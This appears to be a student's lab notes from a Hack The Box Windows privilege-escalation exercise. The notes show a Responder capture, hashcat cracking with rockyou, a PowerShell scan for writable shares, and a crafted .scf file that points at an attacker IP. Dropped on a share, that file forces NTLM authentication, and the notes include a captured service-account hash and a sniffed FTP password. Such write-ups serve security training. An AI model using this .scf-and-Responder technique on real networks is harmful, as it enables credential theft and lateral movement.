...
![Npcap 0.9986 Setup window with installation options: Legacy loopback support, Restrict driver's access to Administrators, Support raw 802.11 traffic, and Install in WinPcap API-compatible mode. No options selected.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/pcap.png)
...
![Wireshark capture showing FTP traffic between IPs 10.129.43.8 and 10.129.43.7. Includes responses and requests like '220-FileZilla Server', 'USER root', and 'PASS FTP_adm1n!'.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/67/ftp.png)
...
```shell-session
xF1NN@htb[/htb]$ sudo responder -wrf -v -I tun0
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
...
```shell-session
xF1NN@htb[/htb]$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
...
---
Found the share which allows write to C:\Department Shares\Public\IT

PS C:\Users\htb-student> $root="C:\Department Shares"
>> $idents = "Everyone","BUILTIN\Users","NT AUTHORITY\Authenticated Users"
>>
...
>>       ($idents -contains $_.IdentityReference.Value) -and
>>       (($_.FileSystemRights.ToString() -match "Write") -or
>>        ($_.FileSystemRights.ToString() -match "CreateFiles") -or
>>        ($_.FileSystemRights.ToString() -match "Modify") -or
>>        ($_.FileSystemRights.ToString() -match "FullControl"))
>>     }
>>   } | Select-Object -ExpandProperty FullName
C:\Department Shares\Public\IT

Crafted @Inventory.scf 

[Shell]
Command=2
IconFile=\\10.10.15.107\share\legit.ico
[Taskbar]
Command=ToggleDesktop

Put it in C:\Department Shares\Public\IT

Started responder on attack machine
$sudo responder -v -I tun0
sccm_svc::WINLPE-SRV01:04fcf7827ece568e:6647F2AFBB0C91BDF86D8DAFA850C73D:
